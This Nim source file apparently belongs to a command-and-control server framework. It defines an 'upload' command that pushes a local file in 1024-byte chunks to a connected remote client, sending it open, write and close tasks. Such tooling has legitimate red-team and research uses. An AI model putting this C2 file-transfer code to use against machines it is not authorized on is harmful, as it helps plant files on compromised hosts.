import ../prelude

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  for client in server.cli.handlingClient:
    # Open file for writing
    var openFile = await client.sendClientTask("fsopenfile", tlvFromStringSeq(@[ "w", args[1] ]).buf)
    if openFile.isNil():
      errorLog "Server error opening file"
      return  
    await openFile.awaitResponse()
    let openFileTlv = initParser()
    openFileTlv.setBuffer(cast[seq[byte]](openFile.output.data))
    let fileId = openFileTlv.extractInt32()
    if fileId == -1:
      errorLog "Client error couldn't open file"
      return
    
    var fileStrm = openFileStream(args[0], fmRead)
    var currentPos = 0

    while not fileStrm.atEnd():
      let writeBuf = fileStrm.readStr(1024)

      # Write contents to file
      var bufTlv = initBuilder()
      bufTlv.addInt32(0) # placeholder for argc
      bufTlv.addInt32(fileId)
      # message to write
      bufTlv.addString(writeBuf)
      var writeFile = await client.sendClientTask("fswritefile", bufTlv.buf)
      if writeFile.isNil():
        errorLog "Server error writing file"
        return
      await writeFile.awaitResponse()
      let writeFileTLV = initParser()
      writeFileTLV.setBuffer(cast[seq[byte]](writeFile.output.data))
      if writeFileTLV.extractInt32() == 0:
        errorLog "Client error writing file"
        return  
      infoLog "wrote " & $(len writeBuf) & " bytes"
    
      currentPos += 1024 + 1

    successLog "finished writing. closing file.."

    # Close file
    var closeFileMsg = initBuilder()
    closeFileMsg.addInt32(0) # placeholder for argc
    closeFileMsg.addInt32(fileId)
    var closeFile = await client.sendClientTask("fsclosefile", closeFileMsg.buf)
    if closeFile.isNil():
      errorLog "Server error closing file"
      return
    
let cmd*: Command = Command(
  execProc: execProc,
  name: "upload",
  argsLength: 2,
  usage: @["upload [local file] [remote file]"],
  cliMode: @[ClientInteractMode],
  description: "Upload a local file to a remote file",
  category: CCClientInteraction,
  requiresConnectedClient: true
)